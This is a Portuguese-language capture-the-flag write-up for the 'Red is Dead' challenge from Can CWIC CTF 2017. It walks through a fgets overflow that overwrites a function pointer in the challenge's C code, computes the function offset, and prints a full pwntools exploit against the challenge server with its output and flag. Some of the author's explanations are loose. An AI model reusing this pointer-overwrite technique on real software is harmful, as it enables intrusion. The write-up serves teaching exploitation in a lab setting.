---
title:  "Red is Dead - Can CWIC CTF 2017"
date:   2017-10-14 10:47:06
categories: [write-ups]
tags: [Can CWIC CTF 2017]
---

Analisando a estrutura `user` nós nos deparamos com uma variável color (8 bytes), uma variável name (8 bytes) e um ponteiro (8 bytes)
sendo uma estrutura de 24 bytes em sistemas 64 bits

``` c
struct user {
    char color[8];
    char name[8];
    void (*next)(struct user*);
};
```

linha 17 a  20 não importa, vamos pular e ir para as funções `success_knight` e `success_king`.
``` c
void success_knight(struct user *user) {
    printf("Keeper: Right. Off you go.\n");
    user->next = NULL;
}

void success_king(struct user *user) {
    printf("Keeper: What? I don't know that! Auuuuuuuugh!\n");
    printf("FLAG\n");
    user->next = NULL;
}
```
temos duas funções, uma `success_knight` e uma `success_king`, essa foi fácil, a função `success_king` é a que entrega a
flag, e a `success_knight` é apenas um caminho que não vai dá em nada, então descartamos ela!

vamos para proxima função `check_knight`.
``` c
void check_knight(struct user *user) {
    user->next = success_knight;
    printf("Keeper: What is your favorite color?\n");
    char *res = fgets(user->color, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->color);
    if (strcmp(user->color,"red")) {
        user->next = dead;
    }
}
```
Observando a linha 36 me deparei com um overflow
``` c
char *res = fgets(user->color, sizeof(struct user), stdin);
```
Aqui ele tá usando o sizeof para pegar a quantidade de bytes da estrutura user e definir
na variável color, ou seja, o que era 8 bytes agora virou 24 bytes!, o que isso nos ajudará?
poderemos fazer um buffer overflow que retornará alguns vazamentos de endereços!.

``` c
void check_king(struct user *user) {
    user->next = success_king;
    printf("Keeper: What is the air-speed velocity of an unladen swallow?\n");
    printf("%s: What do you mean?\n", user->name);
    char *res = fgets(user->color, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->color);
    user->next = success_king;
    if (strcmp(user->color,"An African or European swallow?")) {
        user->next = dead;
    }
}
```

``` c
void start(struct user *user) {
    printf("Keeper: Stop! What is your name?\n");
    char *res = fgets(user->name, sizeof(struct user), stdin);
    if (res == NULL) {
        user->next = NULL;
        return;
    }
    chomp(user->name);

    size_t len = strlen(user->name);
    if (len < 2) { printf("Keeper: Sorry `%s', your name is too short\n", user->name);
        user->next = NULL;
        return;
    }

    if(!strncmp(user->name, "Arthur", 6)) {
        user->next = check_king;
        printf("Arthur: It is Arthur, King of the Britons.\n");
    } else {
        user->next = check_knight;
        printf("%s: Sir %s of Camelot.\n", user->name, user->name);
    }
}
```

Bem, nós poderia começar com o nome `Arthur` e nós iria para `check_king`fazendo a substituição do próximo usuário, mas não havia como ir para o check seguinte!

então nós iria para `user->next = success_king;` que nos daria a flag, foi o que eu pensei, porém, not so easy!

``` c
chomp(user->color);
    user->next = success_king;
    if (strcmp(user->color,"An African or European swallow?")) {
        user->next = dead;
```

Para ir para o `success king` isso era impossível, pois o comprimento da string era (31) maior do que o número de bytes para a cor (24), portanto, o strcmp sempre retornaria verdadeiro, e o próximo usuário iria para dead.

Portanto o check correto é o `check_knight`
``` c
if (strcmp(user->color,"red")) {
    user->next = dead;
}
```

Temos que burlar a cor para red, isso é fácil já que o fgets ler bytes nulos nós fazeria com`‘red\0’`, cor burlada
agora vamos ajeitar o caminho do `success_king`

Dando um objdump -t <nome do arquivo> teremos o andress das minhas duas funções `success_king` e `success_knight`

``` c
000000000040084e success_king
000000000040082a success_knight
```

Agora para calcular o deslocamento basta diminuir o andress de uma função pela outra

``` python
>>> hex (0x000000000040084e - 0x000000000040082a)
'0x25'
>>> 0x25
37
```

Temos nossa distancia de uma função para outra, `37`, então, teremos que subtrair do andress do `check_king`
tendo tudo que precisamos, é hora do solve

``` python
from pwn import *
from struct import pack, unpack
from time import sleep

def packed(blank):
    return pack("<q", blank)

r = remote('159.203.38.169', 5683)
r.recv(1024)

print("[ok] Bufffer Overflow]... ")
r.send('0x8bytes' + '\n')
time.sleep(0.7)

print("[ok] Address of check_knight...")
output = r.recv(1024).strip()
andress = output[8:14] + '\x00\x00'
andress = unpack("<q", andress)[0]
time.sleep(0.7)

print("[OK] Address of success_king...")
andress += -37
time.sleep(0.7)

print("[OK] Success_king...")
r.send('red\0' + '0x00' + '0x000000' + packed(andress))
time.sleep(0.7)

output = r.recv(1024)
print(output[output.find('\nFLAG'):])
r.close()
```

``` c
[+] Opening connection to 159.203.38.169 on port 5683: Done
[ok] Bufffer Overflow]... 
[ok] Address of check_knight...
[OK] Address of success_king...
[OK] Success_king...

FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}
```

`FLAG{Y0uCr0ss3dTh3Br1g30fD3ath}`

[Download da challenge](https://www.sendspace.com/file/m9mm2s){:target="_blank"}

Agradecimentos ao Mateus Pimentel
